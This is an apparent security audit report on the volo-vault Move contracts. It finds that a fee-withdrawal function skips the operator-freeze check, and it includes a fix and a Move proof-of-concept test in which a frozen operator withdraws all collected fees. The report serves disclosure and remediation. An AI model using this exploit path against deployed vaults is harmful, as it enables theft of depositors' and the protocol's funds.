# Audit Report

## Title
Operator Freeze Bypass in Fee Withdrawal Function

## Summary
The `retrieve_deposit_withdraw_fee_operator` function allows frozen operators to withdraw accumulated deposit/withdrawal fees, completely bypassing the operator freeze security mechanism. This enables a malicious or compromised operator to steal all vault fees even after administrative freeze action.

## Finding Description

The vulnerability exists in the `retrieve_deposit_withdraw_fee_operator` function in the vault management module, which lacks operator freeze validation. [1](#0-0) 

**Root Cause**: This function only requires `&OperatorCap` but does NOT take the `&Operation` parameter. Without access to the `Operation` shared object, the function cannot call `assert_operator_not_freezed` to verify the operator's frozen status.

**Comparison with Protected Functions**: All legitimate operator functions properly check freeze status by:
1. Taking both `operation: &Operation` and `cap: &OperatorCap` as parameters
2. Calling `vault::assert_operator_not_freezed(operation, cap)` before executing

For example, `execute_deposit` and other vault operation functions implement this protection [2](#0-1) , and reward manager functions similarly check freeze status [3](#0-2) .

The freeze check implementation requires the `Operation` object to access the `freezed_operators` table [4](#0-3)  and performs the validation [5](#0-4) .

**Why Protections Fail**: The underlying `retrieve_deposit_withdraw_fee` implementation only validates vault version and status, with no awareness of operator freeze state [6](#0-5) .

## Impact Explanation

**Direct Fund Impact**: A malicious or compromised operator can steal all accumulated deposit and withdrawal fees from the vault. The amount depends on vault activity but could be substantial for active vaults with significant transaction volume.

**Security Integrity Breach**: The operator freeze mechanism is a critical security control defined in the Operation struct [7](#0-6)  and managed through admin-only freeze functions [8](#0-7) . This bypass completely undermines that protection for fee withdrawal operations.

**Affected Parties**:
- Vault depositors whose fees should be managed by protocol
- Protocol treasury expecting to collect legitimate fee revenue  
- Admin who loses ability to prevent fee theft upon detecting malicious behavior

**Severity**: HIGH - Complete bypass of a critical security control with direct theft of accumulated funds.

## Likelihood Explanation

**Attacker Capabilities**: Requires only normal operator privileges (possession of `OperatorCap`). No privilege escalation or complex setup needed.

**Attack Complexity**: Minimal - single function call with two parameters (vault reference and withdrawal amount).

**Feasible Scenario**:
1. Admin detects operator causing losses or suspicious activity
2. Admin submits transaction calling `set_operator_freezed(operation, op_cap_id, true)`
3. Operator (either anticipating detection or continuously malicious) submits transaction calling `retrieve_deposit_withdraw_fee_operator`
4. Due to Sui's consensus ordering, operator's transaction may execute first, or can execute even after freeze
5. Operator successfully extracts all fees despite freeze mechanism

**Probability Assessment**: HIGH - The exploitation requires only that the operator submit a fee withdrawal transaction. This is trivially achievable and does not require sophisticated timing attacks. Even if frozen first, the operator can still call this function since it lacks the freeze check.

## Recommendation

Add the `operation: &Operation` parameter to `retrieve_deposit_withdraw_fee_operator` and call `vault::assert_operator_not_freezed` before allowing fee withdrawal:

```move
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault::assert_operator_not_freezed(operation, cap);
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

This aligns the function with all other operator functions in the codebase that properly enforce the freeze mechanism.

## Proof of Concept

```move
#[test]
public fun test_frozen_operator_can_still_retrieve_fees() {
    let mut s = test_scenario::begin(OWNER);
    let mut clock = clock::create_for_testing(s.ctx());
    
    // Initialize vault and create operator
    init_vault::init_vault(&mut s, &mut clock);
    init_vault::init_create_vault<SUI_TEST_COIN>(&mut s);
    
    s.next_tx(OWNER);
    {
        let admin_cap = s.take_from_sender<AdminCap>();
        let operator_cap = vault_manage::create_operator_cap(&admin_cap, s.ctx());
        transfer::public_transfer(operator_cap, OWNER);
        s.return_to_sender(admin_cap);
    };
    
    // Accumulate some fees through deposits
    s.next_tx(OWNER);
    {
        let coin = coin::mint_for_testing<SUI_TEST_COIN>(1_000_000_000, s.ctx());
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let mut reward_manager = s.take_shared<RewardManager<SUI_TEST_COIN>>();
        
        user_entry::deposit(&mut vault, &mut reward_manager, coin, 1_000_000_000, 
                           1_000_000_000, option::none(), &clock, s.ctx());
        
        test_scenario::return_shared(vault);
        test_scenario::return_shared(reward_manager);
    };
    
    // Freeze the operator
    s.next_tx(OWNER);
    {
        let admin_cap = s.take_from_sender<AdminCap>();
        let mut operation = s.take_shared<Operation>();
        let operator_cap = s.take_from_sender<OperatorCap>();
        
        vault_manage::set_operator_freezed(&admin_cap, &mut operation, 
                                          operator_cap.operator_id(), true);
        
        // Verify operator is frozen
        assert!(vault::operator_freezed(&operation, operator_cap.operator_id()));
        
        test_scenario::return_shared(operation);
        s.return_to_sender(operator_cap);
        s.return_to_sender(admin_cap);
    };
    
    // VULNERABILITY: Frozen operator can still retrieve fees
    s.next_tx(OWNER);
    {
        let operator_cap = s.take_from_sender<OperatorCap>();
        let mut vault = s.take_shared<Vault<SUI_TEST_COIN>>();
        let operation = s.take_shared<Operation>();
        
        // Verify operator is still frozen
        assert!(vault::operator_freezed(&operation, operator_cap.operator_id()));
        
        let fee_amount = vault.deposit_withdraw_fee_collected();
        
        // THIS SHOULD FAIL BUT DOESN'T - frozen operator withdraws fees
        let fees = vault_manage::retrieve_deposit_withdraw_fee_operator(
            &operator_cap, &mut vault, fee_amount
        );
        
        // Frozen operator successfully stole the fees
        assert!(fees.value() == fee_amount);
        
        fees.destroy_for_testing();
        test_scenario::return_shared(vault);
        test_scenario::return_shared(operation);
        s.return_to_sender(operator_cap);
    };
    
    clock.destroy_for_testing();
    s.end();
}
```

## Notes

This vulnerability demonstrates a critical inconsistency in the operator freeze enforcement pattern. While all 40+ operator functions across `operation.move` and `reward_manager.move` properly check freeze status, the fee withdrawal function in `manage.move` was designed without the `Operation` parameter, making the freeze check architecturally impossible. The fix requires adding the parameter to match the established security pattern throughout the codebase.

### Citations

**File:** volo-vault/sources/manage.move (L88-95)
```text
public fun set_operator_freezed(
    _: &AdminCap,
    operation: &mut Operation,
    op_cap_id: address,
    freezed: bool,
) {
    vault::set_operator_freezed(operation, op_cap_id, freezed);
}
```

**File:** volo-vault/sources/manage.move (L150-156)
```text
public fun retrieve_deposit_withdraw_fee_operator<PrincipalCoinType>(
    _: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    vault.retrieve_deposit_withdraw_fee(amount)
}
```

**File:** volo-vault/sources/operation.move (L381-404)
```text
public fun execute_deposit<PrincipalCoinType>(
    operation: &Operation,
    cap: &OperatorCap,
    vault: &mut Vault<PrincipalCoinType>,
    reward_manager: &mut RewardManager<PrincipalCoinType>,
    clock: &Clock,
    config: &OracleConfig,
    request_id: u64,
    max_shares_received: u256,
) {
    vault::assert_operator_not_freezed(operation, cap);

    reward_manager.update_reward_buffers(vault, clock);

    let deposit_request = vault.deposit_request(request_id);
    reward_manager.update_receipt_reward(vault, deposit_request.receipt_id());

    vault.execute_deposit(
        clock,
        config,
        request_id,
        max_shares_received,
    );
}
```

**File:** volo-vault/sources/reward_manager.move (L235-242)
```text
    operation: &Operation,
    cap: &OperatorCap,
    clock: &Clock,
    with_buffer: bool, // If true, create a new reward buffer distribution for the reward type
) {
    self.check_version();
    vault::assert_operator_not_freezed(operation, cap);

```

**File:** volo-vault/sources/volo_vault.move (L88-92)
```text
// Operation operation
public struct Operation has key, store {
    id: UID,
    freezed_operators: Table<address, bool>,
}
```

**File:** volo-vault/sources/volo_vault.move (L380-385)
```text
public(package) fun assert_operator_not_freezed(operation: &Operation, cap: &OperatorCap) {
    let cap_id = cap.operator_id();
    // If the operator has ever been freezed, it will be in the freezed_operator map, check its value
    // If the operator has never been freezed, no error will be emitted
    assert!(!operator_freezed(operation, cap_id), ERR_OPERATOR_FREEZED);
}
```

**File:** volo-vault/sources/volo_vault.move (L1544-1557)
```text
public(package) fun retrieve_deposit_withdraw_fee<PrincipalCoinType>(
    self: &mut Vault<PrincipalCoinType>,
    amount: u64,
): Balance<PrincipalCoinType> {
    self.check_version();
    self.assert_normal();

    emit(DepositWithdrawFeeRetrieved {
        vault_id: self.vault_id(),
        amount: amount,
    });

    self.deposit_withdraw_fee_collected.split(amount)
}
```
